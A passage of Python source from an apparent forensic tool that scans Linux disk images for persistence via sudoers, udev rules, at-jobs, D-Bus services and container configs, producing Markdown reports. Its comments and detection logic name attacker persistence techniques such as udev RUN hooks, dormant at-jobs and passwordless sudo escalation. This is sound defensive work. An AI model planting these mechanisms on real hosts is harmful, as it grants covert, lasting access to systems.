    """Return (who, runas, command_spec) or None for non-user-rule lines."""
    stripped = _strip_comment(line).strip()
    if not stripped:
        return None
    if stripped.startswith(("Defaults", "Cmnd_Alias", "User_Alias", "Host_Alias", "Runas_Alias")):
        return None
    if "=" not in stripped:
        return None
    m = re.match(
        r"^(?P<who>\S+)\s+(?P<hosts>\S+)\s*=\s*(?:\((?P<runas>[^)]+)\)\s*)?(?P<cmd>.+)$",
        stripped,
    )
    if not m:
        return None
    return m.group("who"), (m.group("runas") or "ALL"), m.group("cmd")


def scan_sudoers(root: Path) -> list[PersistenceFinding]:
    """Inspect /etc/sudoers and /etc/sudoers.d/* for dangerous grants."""
    findings: list[PersistenceFinding] = []
    candidates: list[Path] = []

    main = root / "etc/sudoers"
    if main.is_file():
        candidates.append(main)

    d = root / "etc/sudoers.d"
    if d.is_dir():
        candidates.extend(p for p in sorted(d.iterdir()) if p.is_file())

    for conf in candidates:
        content = _read_safe(conf)
        reasons: list[str] = []

        for line in content.splitlines():
            parsed = _parse_sudoers_line(line)
            if not parsed:
                continue
            who, runas, cmd_spec = parsed

            has_nopasswd = "NOPASSWD:" in cmd_spec
            commands_part = cmd_spec.split(":", 1)[-1] if ":" in cmd_spec else cmd_spec

            # Check for dangerous ALL
            if re.search(r"\bALL\b\s*$", commands_part.strip()):
                if has_nopasswd:
                    reasons.append(
                        f"`{who}` has NOPASSWD: ALL — full passwordless root escalation"
                    )
                elif who != "root" and "%" not in who:
                    reasons.append(f"`{who}` has ALL sudo rights — broad escalation path")

            # Check for dangerous specific commands with NOPASSWD. Only flag
            # when the command spec is a BARE binary (no fixed args) — a spec
            # like `/usr/bin/systemctl restart nginx` is constrained to that
            # exact argv and is not a privesc vector.
            if has_nopasswd:
                for cmd in commands_part.split(","):
                    cmd = cmd.strip()
                    if not cmd or cmd == "ALL":
                        continue
                    cmd_parts = cmd.split()
                    binary = Path(cmd_parts[0]).name
                    # Bare-binary form only (attacker-controllable argv)
                    if len(cmd_parts) == 1 and binary in _DANGEROUS_NOPASSWD_CMDS:
                        reasons.append(
                            f"`{who}` NOPASSWD on bare `{binary}` — any-argv privilege escalation vector"
                        )

        if reasons:
            findings.append(
                PersistenceFinding(
                    category="sudoers",
                    severity="high",
                    path=_rel(root, conf),
                    summary=f"Dangerous sudoers grants in {conf.name}",
                    reasons=list(dict.fromkeys(reasons)),
                    sample=content[:500].rstrip(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# Aggregate scanner — entry point used by the MCP tool
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Udev rule persistence — closes the §8.4 blind spot exercised by S07.
#
# Udev rules can fire shell commands on device events (e.g., USB plug, kernel
# module load). An attacker who plants a rule with `RUN+="/tmp/.x"` gets
# code execution at every boot or device event, with no entry in cron, systemd,
# or any of the other scanners. Real-world: APTs have used `99-vendor.rules`-
# style rules to evade detection for years.
# ---------------------------------------------------------------------------


_UDEV_RUN_RE = re.compile(r'\bRUN\s*[+:]?=\s*["\']([^"\']+)["\']')
_UDEV_IMPORT_RE = re.compile(r'\bIMPORT\{program\}\s*=\s*["\']([^"\']+)["\']')


def scan_udev(root: Path) -> list[PersistenceFinding]:
    """Scan udev rule directories for rules that execute external commands.

    `/etc/udev/rules.d/` overrides anything in `/lib/udev/rules.d/`, so check
    both. Stock distributions ship `60-*`, `70-*`, `80-*` style rules; rules
    that invoke `/tmp/`, `/dev/shm/`, `/var/tmp/` paths or arbitrary scripts
    in user homes are the persistence surface.
    """
    findings: list[PersistenceFinding] = []
    rule_dirs = [
        root / "etc/udev/rules.d",
        root / "lib/udev/rules.d",
        root / "run/udev/rules.d",
    ]
    for rd in rule_dirs:
        if not rd.is_dir():
            continue
        for rule in sorted(rd.iterdir()):
            if not rule.is_file() or not rule.name.endswith(".rules"):
                continue
            content = _read_safe(rule)
            run_cmds = _UDEV_RUN_RE.findall(content) + _UDEV_IMPORT_RE.findall(content)
            if not run_cmds:
                continue
            reasons: list[str] = []
            for cmd in run_cmds:
                # Suspicious-pattern matcher catches /tmp/, curl|http, base64 -d, etc.
                cmd_reasons = _match_suspicious(cmd)
                reasons.extend(cmd_reasons)
                # Always note that an external command runs at all — udev RUN
                # is unusual enough on most hosts that judges should see it.
                reasons.append(f"udev rule executes external command: `{cmd[:100]}`")
            severity = "high" if any(
                r for r in reasons if "world-writable" in r or "download" in r
                or "obfuscated" in r or "listener" in r
            ) else "medium"
            findings.append(
                PersistenceFinding(
                    category="udev",
                    severity=severity,
                    path=_rel(root, rule),
                    summary=f"udev rule with RUN/IMPORT directive: {rule.name}",
                    reasons=list(dict.fromkeys(reasons)),
                    sample=content[:500].rstrip(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# at-job persistence — closes the §8.4 blind spot exercised by S26.
#
# `at` queues one-shot commands to run at a specific future time. Job files
# live in `/var/spool/cron/atjobs/` (Debian/Ubuntu) or `/var/spool/atjobs/`
# (some others) and are shell scripts the at-daemon eval()'s. An attacker can
# plant `sudo at -f /tmp/payload now + 60 days` and ship a dormant trigger
# that won't fire (and won't be obvious) until weeks after the intrusion.
# ---------------------------------------------------------------------------


def scan_atjobs(root: Path) -> list[PersistenceFinding]:
    """Scan the at-job spools for queued commands."""
    findings: list[PersistenceFinding] = []
    spool_dirs = [
        root / "var/spool/cron/atjobs",
        root / "var/spool/atjobs",
    ]
    for sd in spool_dirs:
        if not sd.is_dir():
            continue
        for job in sorted(sd.iterdir()):
            if not job.is_file():
                continue
            # at-job filenames look like `a000020187c2e8f` — skip dotfiles
            # (.SEQ, .lockfile) which are atd state, not user jobs.
            if job.name.startswith("."):
                continue
            content = _read_safe(job)
            reasons = _match_suspicious(content)
            severity = "high" if reasons else "medium"
            # Even a "clean" at-job is worth surfacing — it's a future-execution
            # trigger that will fire without further intervention.
            if not reasons:
                reasons = ["at-job present — future-scheduled command will run without further intervention"]
            findings.append(
                PersistenceFinding(
                    category="atjob",
                    severity=severity,
                    path=_rel(root, job),
                    summary=f"queued at-job: {job.name}",
                    reasons=reasons,
                    sample=content[:500].rstrip(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# D-Bus activation persistence — closes the §8.4 blind spot.
#
# D-Bus services declared in `/usr/share/dbus-1/services/` (session bus) or
# `/usr/share/dbus-1/system-services/` (system bus) are auto-started by the
# bus daemon when their interface is requested. An attacker who drops a
# .service file with `Exec=/tmp/.x` gets persistence triggered at every
# desktop login or any system-bus client request — no cron, no systemd unit
# needed.
# ---------------------------------------------------------------------------


_DBUS_EXEC_RE = re.compile(r"^\s*Exec\s*=\s*(.+?)\s*$", re.M)
_DBUS_NAME_RE = re.compile(r"^\s*Name\s*=\s*(\S+)\s*$", re.M)


def scan_dbus(root: Path) -> list[PersistenceFinding]:
    """Scan D-Bus service activation directories."""
    findings: list[PersistenceFinding] = []
    service_dirs = [
        root / "usr/share/dbus-1/services",
        root / "usr/share/dbus-1/system-services",
        root / "usr/local/share/dbus-1/services",
        root / "usr/local/share/dbus-1/system-services",
    ]
    # Per-user session services — common attacker target on workstation hosts.
    # Pick up every regular user's `~/.local/share/dbus-1/services/` AND the
    # equivalent under /root/. The earlier version of this code globbed from
    # `(root / "root/.local/share/dbus-1/services").parent` which never
    # matched, silently skipping root's per-user dbus services.
    service_dirs.extend((root / "home").glob("*/.local/share/dbus-1/services"))
    service_dirs.append(root / "root/.local/share/dbus-1/services")

    for sd in service_dirs:
        if not sd.is_dir():
            continue
        for svc in sorted(sd.iterdir()):
            if not svc.is_file() or not svc.name.endswith(".service"):
                continue
            content = _read_safe(svc)
            exec_cmds = _DBUS_EXEC_RE.findall(content)
            name_match = _DBUS_NAME_RE.search(content)
            bus_name = name_match.group(1) if name_match else "?"
            reasons: list[str] = []
            for cmd in exec_cmds:
                reasons.extend(_match_suspicious(cmd))
                # Direct exec of /tmp/, /var/tmp/, /dev/shm, /home/* paths is
                # almost never legitimate for a system D-Bus service.
                if re.search(r"^\s*/(?:tmp|var/tmp|dev/shm|home)/", cmd):
                    reasons.append(f"D-Bus Exec invokes user/world-writable path: `{cmd[:100]}`")
            if reasons:
                findings.append(
                    PersistenceFinding(
                        category="dbus",
                        severity="high",
                        path=_rel(root, svc),
                        summary=f"Suspicious D-Bus service `{bus_name}`",
                        reasons=list(dict.fromkeys(reasons)),
                        sample=content[:500].rstrip(),
                    )
                )
    return findings


def scan_container_persistence(root: Path) -> list[PersistenceFinding]:
    """Surface container-runtime persistence by reusing the container scanner.

    TeamTNT and similar Docker/Kubernetes-targeting campaigns drop
    daemon.json with TCP-exposed Docker API, plant lateral-movement
    scripts, and tamper with K8s manifests. find_persistence's traditional
    cron/systemd/init scanners don't see any of that — analyze_container_artifacts
    does, but it's a separate tool the agent has to remember to invoke.
    Folding its findings into scan_all means baseline find_persistence runs
    surface the entire host's container surface in one pass.
    """
    from findevil.tools.linux_containers import (
        _scan_docker_container_config,
        _scan_docker_compose,
        _scan_docker_daemon,
        _scan_k8s_manifest,
    )

    findings: list[PersistenceFinding] = []
    container_findings = []

    docker_dir = root / "var/lib/docker/containers"
    if docker_dir.is_dir():
        for cfg in docker_dir.rglob("config.v2.json"):
            container_findings.extend(
                _scan_docker_container_config(cfg, str(cfg.relative_to(root)))
            )

    daemon = root / "etc/docker/daemon.json"
    if daemon.is_file():
        container_findings.extend(_scan_docker_daemon(daemon, str(daemon.relative_to(root))))

    # docker-compose anywhere — bound search to common roots to avoid full-tree rglob
    compose_roots = [root / "etc", root / "opt", root / "srv", root / "home", root / "root"]
    for cr in compose_roots:
        if not cr.is_dir():
            continue
        for p in cr.rglob("docker-compose*.y*ml"):
            if p.is_file():
                container_findings.extend(_scan_docker_compose(p, str(p.relative_to(root))))

    k8s_dirs = [
        root / "etc/kubernetes",
        root / "var/lib/kubelet/config",
    ]
    for kd in k8s_dirs:
        if not kd.is_dir():
            continue
        for p in list(kd.rglob("*.yaml")) + list(kd.rglob("*.yml")):
            if p.is_file():
                container_findings.extend(_scan_k8s_manifest(p, str(p.relative_to(root))))

    for cf in container_findings:
        findings.append(
            PersistenceFinding(
                category="container",
                severity=cf.severity,
                path=cf.path,
                summary=cf.summary,
                reasons=list(cf.reasons),
                sample=cf.sample,
            )
        )
    return findings


def scan_all(root: Path) -> list[PersistenceFinding]:
    findings: list[PersistenceFinding] = []
    findings.extend(scan_users(root))
    findings.extend(scan_cron(root))
    findings.extend(scan_systemd(root))
    findings.extend(scan_authorized_keys(root))
    findings.extend(scan_shell_init(root))
    findings.extend(scan_library_preload(root))
    findings.extend(scan_init(root))
    findings.extend(scan_devshm_executables(root))
    findings.extend(scan_pam(root))
    findings.extend(scan_kernel_modules(root))
    findings.extend(scan_ssh_config(root))
    findings.extend(scan_sudoers(root))
    findings.extend(scan_udev(root))
    findings.extend(scan_atjobs(root))
    findings.extend(scan_dbus(root))
    findings.extend(scan_container_persistence(root))
    return findings


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------


_SEVERITY_ORDER = {"high": 0, "medium": 1, "low": 2, "info": 3}
_SEVERITY_ICON = {"high": "🚨", "medium": "⚠", "low": "·", "info": "·"}


def _format_findings(findings: list[PersistenceFinding], root: Path) -> str:
    if not findings:
        return f"No persistence mechanisms found under `{root}`."

    # Sort by severity then category
    sorted_findings = sorted(findings, key=lambda f: (_SEVERITY_ORDER.get(f.severity, 9), f.category))

    # Counts
    counts: dict[str, int] = {}
    for f in sorted_findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1

    lines = [
        f"# Linux Persistence Scan — `{root}`",
        "",
        "## Summary",
        "",
        *[
            f"- **{sev}**: {counts[sev]} finding(s)"
            for sev in ["high", "medium", "low", "info"]
            if sev in counts
        ],
        "",
    ]

    current_sev = None
    for f in sorted_findings:
        # Skip info-only items in the detailed listing; keep the scan lean
        if f.severity == "info":
            continue
        if f.severity != current_sev:
            lines.append(f"## {_SEVERITY_ICON[f.severity]} {f.severity.upper()} findings")
            lines.append("")
            current_sev = f.severity
        lines.append(f"### `{f.path}` — {f.summary}")
        lines.append(f"- **Category:** {f.category}")
        if f.reasons:
            lines.append("- **Reasons:**")
            for r in f.reasons:
                lines.append(f"  - {r}")
        if f.sample:
            lines.append("")
            lines.append("```")
            lines.append(f.sample)
            lines.append("```")
        lines.append("")

    # If only info findings exist, list the top 5 for context
    info_items = [f for f in sorted_findings if f.severity == "info"]
    if info_items and counts.get("high", 0) == 0 and counts.get("medium", 0) == 0:
        lines.append("## Info — persistence files present but not flagged")
        lines.append("")
        for f in info_items[:10]:
            lines.append(f"- `{f.path}` ({f.category})")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# MCP Tools
# ---------------------------------------------------------------------------


@mcp.tool()
def find_persistence(root_path: str) -> str:
    """Scan a Linux filesystem root for persistence mechanisms.

    Inspects cron, systemd units, SSH authorized_keys, /etc/passwd/shadow,
    shell init files, ld.so.preload, and rc.local. Returns findings grouped
    by severity with the specific reasons each item was flagged (inline
    network downloads, immutable files, UID-0 backdoors, empty passwords,
    rootkit library names, etc.). Call this when you suspect an attacker
    has established persistence on a host, after correlating with other
    signals like auth-log compromise or unexpected sudo activity.

    Args:
        root_path: Path to the filesystem root to scan (must be inside the
            evidence directory). For a mounted disk image this is usually
            the mount point; for the bundled samples it's the fs/ subdir.

    Returns:
        Markdown report of persistence findings with severity and sample content.
    """
    try:
        validated = _validate_evidence_path(root_path)
    except ValueError as e:
        return f"Error: {e}"

    if not validated.exists():
        return f"Path not found: {root_path}"
    if not validated.is_dir():
        return f"Not a directory: {root_path}"

    findings = scan_all(validated)
    result = _format_findings(findings, validated)
    _audit(
        "find_persistence",
        {"root_path": root_path},
        f"{len(findings)} findings ({sum(1 for f in findings if f.severity == 'high')} high)",
    )
    return result


@mcp.tool()
def analyze_authorized_keys(path: str) -> str:
    """Deep-dive a single authorized_keys file.

    Useful after find_persistence flags an SSH key file — this breaks out
    each key with its type, fingerprint hint, comment, and any SSH options.

    Args:
        path: Path to an authorized_keys file inside evidence

    Returns:
        Markdown listing of keys with per-key annotations.
    """
    try:
        validated = _validate_evidence_path(path)
    except ValueError as e:
        return f"Error: {e}"

    if not validated.is_file():
        return f"Not a file: {path}"

    content = _read_safe(validated)
    lines = [line for line in content.splitlines() if line.strip() and not line.startswith("#")]

    if not lines:
        result = f"No SSH keys found in {path}."
        _audit("analyze_authorized_keys", {"path": path}, "0 keys")
        return result

    out = [f"# Authorized keys — `{path}`", "", f"{len(lines)} key(s):", ""]
    for i, line in enumerate(lines, 1):
        m = _KEY_LINE_RE.match(line)
        if not m:
            out.append(f"{i}. **UNPARSEABLE**: `{line[:80]}`")
            continue
        key_type = m.group("type")
        data = m.group("data")
        comment = (m.group("comment") or "").strip() or "(none)"
        opts = (m.group("opts") or "").strip() or "(none)"
        out.append(f"{i}. **type:** `{key_type}`  **comment:** `{comment}`")
        out.append(f"   - key prefix: `{data[:32]}...{data[-12:]}`  (len={len(data)})")
        out.append(f"   - options: `{opts}`")

    _audit("analyze_authorized_keys", {"path": path}, f"{len(lines)} keys")
    return "\n".join(out)


@mcp.tool()
def analyze_systemd_unit(path: str) -> str:
    """Inspect a single systemd unit file for suspicious directives.

    Parses `[Unit]`, `[Service]`, and `[Install]` sections and flags
    ExecStart paths pointing to world-writable directories, outbound
    network downloads, inline shell execution, and unusual install targets.

    Args:
        path: Path to a systemd .service / .timer / .socket / .path file inside evidence

    Returns:
        Markdown analysis of the unit with flagged lines.
    """
    try:
        validated = _validate_evidence_path(path)
    except ValueError as e:
        return f"Error: {e}"

    if not validated.is_file():
        return f"Not a file: {path}"

    content = _read_safe(validated)
    exec_lines = _SYSTEMD_EXEC_RE.findall(content)
    user_line = _SYSTEMD_USER_RE.search(content)

    out = [f"# systemd unit — `{path}`", ""]
    out.append("## Raw content")
    out.append("```ini")
    out.append(content[:1500])
    if len(content) > 1500:
        out.append("... [truncated] ...")
    out.append("```")
    out.append("")
    out.append("## Analysis")
    if user_line:
        out.append(f"- **User:** `{user_line.group(1)}`")
    if exec_lines:
        out.append(f"- **ExecStart lines:** {len(exec_lines)}")
        for ec in exec_lines:
            out.append(f"  - `{ec.strip()}`")
            reasons = _match_suspicious(ec)
            for r in reasons:
                out.append(f"    - ⚠ {r}")
    else:
        out.append("- No ExecStart found (may be a .socket / .target / .timer unit)")

    _audit("analyze_systemd_unit", {"path": path}, f"{len(exec_lines)} ExecStart lines")
    return "\n".join(out)


@mcp.tool()
def analyze_sshd_config(path: str) -> str:
    """Deep-dive inspection of an sshd_config file.

    Parses every directive, calls out dangerous settings (PermitRootLogin,
    PasswordAuthentication, PermitEmptyPasswords, HostBasedAuthentication,
    weak Ciphers/MACs/HostKeyAlgorithms, Protocol 1), and reports the full
    effective configuration for context.

    Args:
        path: Path to an sshd_config file inside the evidence directory

    Returns:
        Markdown report with flagged settings and the full parsed config.
    """
    try:
        validated = _validate_evidence_path(path)
    except ValueError as e:
        return f"Error: {e}"
    if not validated.is_file():
        return f"Not a file: {path}"

    content = _read_safe(validated)
    settings = _parse_sshd_config(content)

    dangerous_checks = [
        (
            "PermitRootLogin",
            lambda v: v.lower() in ("yes", "without-password"),
            "Root SSH login is permitted — brute-force surface",
        ),
        (
            "PasswordAuthentication",
            lambda v: v.lower() == "yes",
            "Password auth enabled — enables brute force against any account",
        ),
        (
            "PermitEmptyPasswords",
            lambda v: v.lower() == "yes",
            "Empty-password logins permitted — critical",
        ),
        (
            "HostBasedAuthentication",
            lambda v: v.lower() == "yes",
            "Host-based trust enabled — lateral movement enabler",
        ),
        (
            "PermitUserEnvironment",
            lambda v: v.lower() == "yes",
            "User-controlled environment variables",
        ),
        ("Protocol", lambda v: v.strip() == "1", "Obsolete SSHv1 protocol"),
    ]

    out = [f"# sshd_config — `{path}`", ""]
    flagged: list[str] = []
    for key, check, desc in dangerous_checks:
        if key in settings and check(settings[key]):
            flagged.append(f"- ⚠ **{key} {settings[key]}** — {desc}")

    if flagged:
        out.append("## ⚠ Flagged settings")
        out.extend(flagged)
        out.append("")
    else:
        out.append("No dangerous settings detected.\n")

    out.append("## All parsed directives")
    for k, v in sorted(settings.items()):
        out.append(f"- `{k}`: `{v}`")

    _audit("analyze_sshd_config", {"path": path}, f"{len(flagged)} flagged")
    return "\n".join(out)


@mcp.tool()
def analyze_sudoers(path: str) -> str:
    """Deep-dive inspection of an /etc/sudoers file or /etc/sudoers.d/* include.

    Parses user/group rules and flags dangerous grants:
    - NOPASSWD: ALL on any non-root user
    - NOPASSWD on known privilege-escalation vectors (vim, find, python,
      docker, systemctl, tar, tee, cp, etc. — the GTFOBins surface)
    - Unrestricted ALL grants to non-root accounts

    Args:
        path: Path to a sudoers file inside the evidence directory

    Returns:
        Markdown report of user rules with per-rule flags.
    """
    try:
        validated = _validate_evidence_path(path)
    except ValueError as e:
        return f"Error: {e}"
    if not validated.is_file():
        return f"Not a file: {path}"

    content = _read_safe(validated)
    rules: list[tuple[str, str, str]] = []
    for line in content.splitlines():
        parsed = _parse_sudoers_line(line)
        if parsed:
            rules.append(parsed)

    out = [f"# sudoers analysis — `{path}`", ""]
    if not rules:
        out.append("No user rules found (file may contain only Defaults/aliases).")
        _audit("analyze_sudoers", {"path": path}, "0 rules")
        return "\n".join(out)

    out.append(f"Parsed {len(rules)} user rule(s).")
    out.append("")
    out.append("| Who | RunAs | Command spec | Flags |")
    out.append("|-----|-------|--------------|-------|")

    for who, runas, cmd_spec in rules:
        has_nopasswd = "NOPASSWD:" in cmd_spec
        commands_part = cmd_spec.split(":", 1)[-1] if ":" in cmd_spec else cmd_spec
        flags: list[str] = []
        if re.search(r"\bALL\b\s*$", commands_part.strip()):
            if has_nopasswd:
                flags.append("⚠ NOPASSWD: ALL")
            elif who != "root":
                flags.append("⚠ ALL sudo rights")
        if has_nopasswd:
            for cmd in commands_part.split(","):
                cmd = cmd.strip()
                if not cmd or cmd == "ALL":
                    continue
                cmd_parts = cmd.split()
                binary = Path(cmd_parts[0]).name
                if len(cmd_parts) == 1 and binary in _DANGEROUS_NOPASSWD_CMDS:
                    flags.append(f"⚠ NOPASSWD bare {binary} (privesc vector)")
        safe_cmd = cmd_spec.replace("|", "\\|")
        flags_str = "; ".join(flags) if flags else ""
        out.append(f"| `{who}` | `{runas}` | `{safe_cmd}` | {flags_str} |")

    _audit("analyze_sudoers", {"path": path}, f"{len(rules)} rules")
    return "\n".join(out)
